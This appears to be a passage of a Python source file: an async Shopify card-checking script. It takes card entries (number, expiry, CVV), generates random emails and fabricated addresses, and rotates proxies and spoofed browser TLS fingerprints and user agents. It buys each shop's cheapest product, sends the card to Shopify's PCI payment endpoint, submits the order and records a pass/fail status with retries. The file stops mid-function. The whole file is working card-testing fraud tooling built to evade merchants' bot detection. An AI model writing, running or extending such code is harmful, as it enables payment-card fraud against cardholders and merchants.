from __future__ import annotations

"""
Async version of auto.py — curl_cffi.AsyncSession instead of Session.
All HTTP functions are async. Pure-Python helpers imported from auto.py.
"""

import asyncio
import json
import re
import html
import random
import urllib.parse

from curl_cffi.requests import AsyncSession

import importlib.util
from pathlib import Path

_here = Path(__file__).resolve().parent
_auto_path = _here / "auto.py"
if not _auto_path.is_file():
    _auto_path = _here.parent / "auto.py"
_spec = importlib.util.spec_from_file_location("shopify_auto", _auto_path)
_auto = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
_spec.loader.exec_module(_auto)

CheckStatus = _auto.CheckStatus
CheckResult = _auto.CheckResult
Address = _auto.Address
BROWSER_PROFILES = _auto.BROWSER_PROFILES
USER_AGENTS = _auto.USER_AGENTS
generate_random_email = _auto.generate_random_email
address_for_country = _auto.address_for_country
parse_card_entry = _auto.parse_card_entry
normalize_proxy = _auto.normalize_proxy
extract_stable_id = _auto.extract_stable_id
extract_commit_sha = _auto.extract_commit_sha
extract_source_token = _auto.extract_source_token
extract_private_access_token_id = _auto.extract_private_access_token_id
extract_actions_js_url = _auto.extract_actions_js_url
extract_proposal_id = _auto.extract_proposal_id
extract_submit_for_completion_id = _auto.extract_submit_for_completion_id
extract_queue_token = _auto.extract_queue_token
extract_seller_currency = _auto.extract_seller_currency
extract_seller_country = _auto.extract_seller_country
extract_seller_merchandise_price = _auto.extract_seller_merchandise_price
extract_is_shipping_required = _auto.extract_is_shipping_required
extract_delivery_handle = _auto.extract_delivery_handle
extract_signed_handles = _auto.extract_signed_handles
extract_shipping_amount = _auto.extract_shipping_amount
extract_checkout_total = _auto.extract_checkout_total
extract_seller_total = _auto.extract_seller_total
extract_running_total = _auto.extract_running_total
extract_tax_amount = _auto.extract_tax_amount
extract_identification_signature = _auto.extract_identification_signature
extract_pci_session_id = _auto.extract_pci_session_id
extract_receipt_id = _auto.extract_receipt_id
extract_receipt_session_token = _auto.extract_receipt_session_token
extract_receipt_status_code = _auto.extract_receipt_status_code
extract_any_error = _auto.extract_any_error
extract_tax_from_rejected = _auto.extract_tax_from_rejected
extract_total_from_rejected = _auto.extract_total_from_rejected
_proposal_headers = _auto._proposal_headers
patch_payload = _auto.patch_payload
check_submit_errors = _auto.check_submit_errors
generate_attempt_token = _auto.generate_attempt_token
generate_page_id = _auto.generate_page_id


# ── Async TLS client ──────────────────────────────────────────────────

class AsyncTLSClient:
    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout     = timeout
        self.proxy_url   = proxy_url
        # 🔥 استخدم البروفايلات المدعومة فقط (بدون firefox133)
        self.impersonate = impersonate or random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
        self.user_agent  = user_agent  or random.choice(USER_AGENTS)
        self._session: AsyncSession | None = None

    def _make_session(self) -> AsyncSession:
        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
        s.headers.update({
            'User-Agent':                self.user_agent,
            'Accept-Language':           'en-US,en;q=0.9',
            'Accept-Encoding':           'gzip, deflate, br',
            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':                'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':            'document',
            'Sec-Fetch-Mode':            'navigate',
            'Sec-Fetch-Site':            'none',
            'Sec-Fetch-User':            '?1',
            'Cache-Control':             'max-age=0',
        })
        if self.proxy_url:
            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None


# ── Step 0: cheapest product ──────────────────────────────────────────

async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                                min_price: float = 0.50):
    best_price = float('inf')
    product_title = product_id = variant_id = price_str = product_handle = ""
    page = 1
    while True:
        resp = await client.get(f"{shop_url}/products.json?limit=250&page={page}")
        if resp.status_code != 200:
            raise Exception(f"GET products.json page {page} returned {resp.status_code}")
        products = resp.json().get("products", [])
        if not products:
            break
        for p in products:
            for v in p.get("variants", []):
                if not v.get("available", False):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price:
                    continue
                if price < best_price:
                    best_price      = price
                    product_title   = p.get("title", "")
                    product_id      = str(p.get("id", ""))
                    product_handle  = p.get("handle", "")
                    variant_id      = str(v.get("id", ""))
                    price_str       = v.get("price", "")
        page += 1
    if not product_title:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")
    return product_title, product_id, product_handle, variant_id, price_str


# ── Step 1: cart → checkout ───────────────────────────────────────────

_PAGE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
}


async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str,
                                   variant_id: str, product_id: str, product_handle: str):
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = await client.get(cart_permalink, allow_redirects=True, headers={
        **_PAGE_HEADERS,
        "user-agent": client.user_agent,
        "referer":    shop_url + "/",
        "sec-fetch-site": "same-origin",
    })
    print(f"[CART-PERMALINK] status={checkout_resp.status_code} final_url={checkout_resp.url}")

    checkout_url  = checkout_resp.url
    checkout_html = checkout_resp.text

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
                               checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""
    return checkout_url, checkout_token, session_token, checkout_html


# ── Step 2: private access token ─────────────────────────────────────

async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str,
                                     checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = await client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ── Step 3: actions JS ────────────────────────────────────────────────

async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = await client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


# ── Step 9: PCI session ───────────────────────────────────────────────

async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                           card_month: int, card_year: int, cvv: str,
                           shop_domain: str, proxy_url: str = ""):
    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": shop_domain,
    })
    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               "https://checkout.pci.shopifyinc.com",
        "priority":             "u=1, i",
        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    async with AsyncSession(impersonate="chrome124") as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        resp = await session.post("https://checkout.pci.shopifyinc.com/sessions",
                                  data=payload, headers=headers, timeout=12)
    return resp.status_code, resp.text


# ── Step 4: Proposal 1 ────────────────────────────────────────────────

async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                        checkout_token: str, session_token: str, stable_id: str,
                        variant_id: str, price: str, proposal_id: str,
                        build_id: str, source_token: str, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Step 5: Proposal 2 (email) ────────────────────────────────────────

async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                         checkout_token: str, session_token: str, stable_id: str,
                         variant_id: str, price: str, proposal_id: str,
                         build_id: str, source_token: str, queue_token: str,
                         email: str, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Step 6/7/8: Proposal 3 (address) ─────────────────────────────────

async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                         checkout_token: str, session_token: str, stable_id: str,
                         variant_id: str, price: str, proposal_id: str,
                         build_id: str, source_token: str, queue_token: str,
                         email: str, addr: Address, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Step 10a: poll for receipt ────────────────────────────────────────

async def send_poll_for_receipt(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                                checkout_token: str, session_token: str, build_id: str,
                                source_token: str, poll_id: str, receipt_id: str,
                                receipt_session_token: str):
    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id,
                                     "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers  = _proposal_headers(shop_url, checkout_url, checkout_token,
                                 session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = await client.get(full_url, headers=headers)
    print(resp.text)
    return resp.status_code, resp.text


# ── Step 10b: submit for completion ──────────────────────────────────

async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
                                     checkout_url: str, checkout_token: str,
                                     session_token: str, stable_id: str, variant_id: str,
                                     price: str, submit_id: str, build_id: str,
                                     source_token: str, queue_token: str, email: str,
                                     addr: Address, delivery_handle: str, shipping_amount: str,
                                     total_amount: str, pci_session_id: str, attempt_token: str,
                                     currency: str, country: str, signed_handles,
                                     is_digital: bool = False, item_amount: str = None,
                                     tax_amount: str = None):
    handle_lines        = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id             = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Main async checkout orchestrator ─────────────────────────────────

async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                                      proxy_url: str = "") -> CheckResult:
    currency  = "USD"
    country   = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(card=card_entry, shop_url=shop_url,
                         site_name=site_name, currency=currency,
                         status=CheckStatus.ERROR)
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email       = generate_random_email()
    # 🔥 استخدم فقط البروفايلات المدعومة
    impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
    user_agent  = random.choice(USER_AGENTS)

    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url,
                            impersonate=impersonate, user_agent=user_agent)
    try:
        # Step 0
        try:
            title, product_id, product_handle, variant_id, price = await find_cheapest_product(client, shop_url)
            print(f"[DBG] site={shop_url} | product='{title}' | handle={product_handle} | variant={variant_id} | price={price}")
            _ = title
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        # Step 1
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        # Step 2
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            await fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        # Step 3
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body     = await fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id   = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        # Step 4
        try:
            _, proposal_body = await send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
